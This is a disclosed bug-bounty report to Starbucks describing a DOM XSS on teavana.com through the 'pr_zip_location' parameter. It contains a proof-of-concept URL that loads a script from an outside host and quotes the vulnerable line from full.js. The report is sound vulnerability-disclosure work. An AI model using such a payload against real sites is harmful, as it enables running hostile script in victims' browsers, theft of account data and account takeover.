# DOM XSS on teavana.com via "pr_zip_location" parameter

## Report Details
- **Report ID**: 209736
- **URL**: https://hackerone.com/reports/209736
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-03-01T00:57:21.852Z
- **Disclosed**: 2017-05-03T13:33:55.922Z

## Reporter
- **Username**: fizhimchik
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: starbucks

## Vulnerability Information
Hello Starbucks team,,

I've discovered DOM XSS on `teavana.com` involving `pr_zip_location` URL parameter. PoC:

http://www.teavana.com/us/en/tea/green-tea/winterberry-tea-blend-32601.html?pr_zip_location=//whitehat-hacker.com/xss.j?

Works in all major browsers. Vulnerable code is in `full.js`:

```js
var DR = Z(DS) + "/content/" + k(DQ) + "/contents.js";
```

That allows to execute absolutely arbitrary javascript in the context on `teavana.com` domain. As described in #202011 that directly leads to theft of customer account data and account takeover, hence I set severity to Critical.

Also, I have discovered a number of other XSS attacks on similar pages, involving other parameters and sinks. Should I submit them all as individual bug reports?

Thanks.


## Attachments
No attachments
